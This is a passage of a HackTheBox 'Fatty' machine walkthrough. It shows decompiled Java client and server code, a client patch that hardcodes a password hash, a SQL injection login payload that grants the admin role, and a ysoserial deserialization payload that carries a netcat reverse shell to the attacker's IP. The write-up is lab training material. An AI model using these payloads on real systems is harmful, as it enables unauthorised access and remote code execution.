</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>tfPassword</span><span class=p>.</span><span class=na>getPassword</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>user</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>User</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>user</span><span class=p>.</span><span class=na>setUsername</span><span class=p>(</span><span class=n>username</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>user</span><span class=p>.</span><span class=na>setPassword</span><span class=p>(</span><span class=n>password</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>conn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Connection</span><span class=p>.</span><span class=na>getConnection</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>htb</span><span class=p>.</span><span class=na>fatty</span><span class=p>.</span><span class=na>client</span><span class=p>.</span><span class=na>connection</span><span class=p>.</span><span class=na>Connection</span><span class=p>.</span><span class=na>ConnectionException</span><span class=w> </span><span class=n>e1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>LoginPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Connection Error!&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>conn</span><span class=p>.</span><span class=na>login</span><span class=p>(</span><span class=n>ClientGuiTest</span><span class=p>.</span><span class=na>this</span><span class=p>.</span><span class=na>user</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>LoginPanel</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Login Successful!&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Login&#34;</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>We can also it in <code>htb/fatty/shared/resources/User.java</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/*     */</span><span class=w>   </span><span class=kd>public</span><span class=w> </span><span class=nf>User</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>uid</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>email</span><span class=p>,</span><span class=w> </span><span class=n>Role</span><span class=w> </span><span class=n>role</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  20 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>uid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uid</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  21 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>username</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  23 */</span><span class=w>     </span><span class=n>String</span><span class=w> </span><span class=n>hashString</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>username</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;clarabibimakeseverythingsecure&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  24 */</span><span class=w>     </span><span class=n>MessageDigest</span><span class=w> </span><span class=n>digest</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>     </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  26 */</span><span class=w>       </span><span class=n>digest</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>MessageDigest</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=s>&#34;SHA-256&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  27 */</span><span class=w>     </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchAlgorithmException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  28 */</span><span class=w>       </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>     </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  30 */</span><span class=w>     </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>hash</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>digest</span><span class=p>.</span><span class=na>digest</span><span class=p>(</span><span class=n>hashString</span><span class=p>.</span><span class=na>getBytes</span><span class=p>(</span><span class=n>StandardCharsets</span><span class=p>.</span><span class=na>UTF_8</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  32 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DatatypeConverter</span><span class=p>.</span><span class=na>printHexBinary</span><span class=p>(</span><span class=n>hash</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  33 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>email</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>email</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*  34 */</span><span class=w>     </span><span class=k>this</span><span class=p>.</span><span class=na>role</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>role</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/*     */</span><span class=w>   </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Putting our payload as username and <code>clarabibi</code> as password should be ok.</p><p>My injection gave me login failed, so I tried something else:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gd>-cyfun&#39; union select 1337,&#39;qtc&#39;,&#39;qtc@fatty.htb&#39;,&#39;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#39;,&#39;admin
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+cyfun&#39; union select id,username,email,password,&#39;admin&#39; FROM users WHERE username=&#39;qtc
</span></span></span></code></pre></td></tr></table></div></div><p>But still failing, let&rsquo;s get back to <code>setPassword</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setPassword</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>String</span><span class=w> </span><span class=n>hashString</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>username</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;clarabibimakeseverythingsecure&#34;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><code>this.username</code> is used so since we&rsquo;re not providing only <code>qtc</code> anymore but our
SQL payload, the calculated hash will be wrong.</p><p>So let&rsquo;s patch it into:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setPassword</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>String</span><span class=w> </span><span class=n>hashString</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;qtc&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;clarabibimakeseverythingsecure&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>But I couldn&rsquo;t modify the <code>User.java</code> file this way because the dependency
<code>import javax.xml.bind.DatatypeConverter;</code> was removed from Java 11+ and
we are using Java 14 for <a href=https://github.com/Col-E/Recaf>recaf</a> so if this file is touched it can&rsquo;t be recompiled
by <a href=https://github.com/Col-E/Recaf>recaf</a> unless you remove all references to <code>DatatypeConverter</code>.</p><p>So that&rsquo;s what I did, I removed the imported and change the whole <code>setPassword</code>
function to the following and did the same in User class:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setPassword</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>this</span><span class=p>.</span><span class=na>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Now we can login with:</p><ul><li>Username: <code>cyfun' union select id,username,email,password,'admin' FROM users WHERE username='qtc</code></li><li>Password: whatever or void because we hardcoded the hash</li></ul><p>Now we have to look at a vuln in an admin-only feature. The only feature
accepting an input is <code>changePW</code>.</p><p>On the server: <code>htb/fatty/server/methods/Commands.java</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>changePW</span><span class=p>(</span><span class=n>ArrayList</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>args</span><span class=p>,</span><span class=w> </span><span class=n>User</span><span class=w> </span><span class=n>user</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>logger</span><span class=p>.</span><span class=na>logInfo</span><span class=p>(</span><span class=s>&#34;[+] Method &#39;changePW&#39; was called.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>methodID</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>7</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>user</span><span class=p>.</span><span class=na>getRole</span><span class=p>().</span><span class=na>isAllowed</span><span class=p>(</span><span class=n>methodID</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>logger</span><span class=p>.</span><span class=na>logError</span><span class=p>(</span><span class=s>&#34;[+] Access denied. Method with id &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>methodID</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; was called by user &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>user</span><span class=p>.</span><span class=na>getUsername</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; with role &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>user</span><span class=p>.</span><span class=na>getRoleName</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=s>&#34;Error: Method &#39;changePW&#39; is not allowed for this user account&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>String</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>String</span><span class=w> </span><span class=n>b64User</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>args</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>serializedUser</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getDecoder</span><span class=p>().</span><span class=na>decode</span><span class=p>(</span><span class=n>b64User</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bIn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>serializedUser</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>oIn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>bIn</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>User</span><span class=w> </span><span class=n>user1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>User</span><span class=p>)</span><span class=n>oIn</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;Error: Failure while recovering the User object.&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>response</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>response</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>response</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;Info: Your call was successful, but the method is not fully implemented yet.&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>response</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>We can see on the server that an object is create from the user input <code>(User)oIn.readObject();</code>.</p><p>There is an article an associated code repository explaining unserialize exploits
in Java commons-collections library:</p><ul><li><a href=https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#thevulnerability>Article</a></li><li><a href=https://github.com/foxglovesec/JavaUnserializeExploits>Code</a></li></ul><p>It seems we have the vulnerable class InvokerTransformer and commons-collection:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ grep -r InvokerTransformer server_source
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */ public class InvokerTransformer
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  56 */     return new InvokerTransformer(methodName);
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  77 */       return new InvokerTransformer(methodName);
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*  81 */     return new InvokerTransformer(methodName, paramTypes, args);
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */   private InvokerTransformer(String methodName) {
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/*     */   public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 128 */       throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + this.iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; does not exist&#34;);
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 130 */       throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + this.iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; cannot be accessed&#34;);
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* 132 */       throw new FunctorException(&#34;InvokerTransformer: The method &#39;&#34; + this.iMethodName + &#34;&#39; on &#39;&#34; + input.getClass() + &#34;&#39; threw an exception&#34;, ex);
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/functors/InvokerTransformer.java:/* Location:              /home/cyfun/CTF/HackTheBox/machines/Fatty/fatty-server.jar!/org/apache/commons/collections/functors/InvokerTransformer.class
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/ClosureUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/ClosureUtils.java:/* 160 */     return asClosure(InvokerTransformer.getInstance(methodName));
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/ClosureUtils.java:/* 179 */     return asClosure(InvokerTransformer.getInstance(methodName, paramTypes, args));
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/PredicateUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/PredicateUtils.java:/* 218 */     return asPredicate(InvokerTransformer.getInstance(methodName));
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/PredicateUtils.java:/* 243 */     return asPredicate(InvokerTransformer.getInstance(methodName, paramTypes, args));
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/TransformerUtils.java:/*     */ import org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/TransformerUtils.java:/* 407 */     return InvokerTransformer.getInstance(methodName, null, null);
</span></span><span class=line><span class=cl>server_source/org/apache/commons/collections/TransformerUtils.java:/* 425 */     return InvokerTransformer.getInstance(methodName, paramTypes, args);
</span></span></code></pre></td></tr></table></div></div><p>However we don&rsquo;t know which version of the library is used.</p><h2 id=java-object-deserialization-exploit>Java object deserialization exploit<a hidden class=anchor aria-hidden=true href=#java-object-deserialization-exploit>#</a></h2><p>Let&rsquo;s craft a reverse shell with <a href=https://github.com/frohoff/ysoserial>ysoserial</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ysoserial CommonsCollections5 &#39;nc 10.10.14.89 8888 -e /bin/sh&#39; &gt; revshell.ser
</span></span></code></pre></td></tr></table></div></div><p>But if we try to send it with receive this error, telling us the code on the
client is not totally finished.</p><p>Let&rsquo;s see where do this error comes from:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ grep -r &#39;Not implemented yet&#39; client_source
</span></span><span class=line><span class=cl>client_source/htb/fatty/client/gui/ClientGuiTest.java:/* 560 */             JOptionPane.showMessageDialog(passwordChange, &#34;Not implemented yet.&#34;, &#34;Error&#34;, 0);
</span></span></code></pre></td></tr></table></div></div><p>The button is not mapped to <code>changePW</code> function.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>changePassword</span><span class=p>.</span><span class=na>addActionListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ActionListener</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>actionPerformed</span><span class=p>(</span><span class=n>ActionEvent</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>controlPanel</span><span class=p>.</span><span class=na>setVisible</span><span class=p>(</span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>passwordChange</span><span class=p>.</span><span class=na>setVisible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>pwChangeButton</span><span class=p>.</span><span class=na>addActionListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ActionListener</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>actionPerformed</span><span class=p>(</span><span class=n>ActionEvent</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>JOptionPane</span><span class=p>.</span><span class=na>showMessageDialog</span><span class=p>(</span><span class=n>passwordChange</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Not implemented yet.&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error&#34;</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>passwordChange</span><span class=p>.</span><span class=na>setVisible</span><span class=p>(</span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>controlPanel</span><span class=p>.</span><span class=na>setVisible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>});</span><span class=w>
